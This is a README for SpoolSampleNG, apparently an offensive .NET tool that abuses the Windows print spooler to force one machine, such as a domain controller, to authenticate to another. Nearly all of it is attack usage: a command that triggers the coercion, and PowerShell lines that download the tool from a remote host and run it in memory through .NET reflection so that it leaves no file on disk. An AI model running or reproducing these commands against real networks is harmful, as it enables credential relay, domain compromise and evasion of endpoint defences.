This repository is a derivative of **leftp**'s [SpoolSamplerNET](https://github.com/leftp/SpoolSamplerNET) repository, modified primarily for .NET reflection support and adjusted syntax.

![Banner](https://github.com/tylerdotrar/SpoolSampleNG/assets/69973771/78294d18-fa8f-4391-870f-123c13c2ec33)

---

# Usage

- Usage from Disk via the Binary:

```powershell
# Force System to Authenticate to Another
# <binary>          <source>      <destination>
./SpoolSampleNG.exe dc1.evil.corp sql.evil.corp

# Return Help Page
./SpoolSampleNG.exe --help
```

- Usage from Memory via .NET Reflection:

```powershell
# Load Binary into Memory Locally
[System.Reflection.Assembly]::LoadFile("$PWD/SpoolSampleNG.exe")

# Load Binary into Memory Remotely
$WebClient = New-Object System.Net.WebClient
$DownloadData = $WebClient.DownloadData("http(s)://<ip_addr>/SpoolSampleNG.exe")
[System.Reflection.Assembly]::Load($DownloadData)

# Load Binary into Memory Remotely (one-liner)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http(s)://<ip_addr>/SpoolSampleNG.exe'))

# Force System to Authenticate to Another
[SpoolSampleNG.Program]::Main(@('<source>','<destination>'))
```
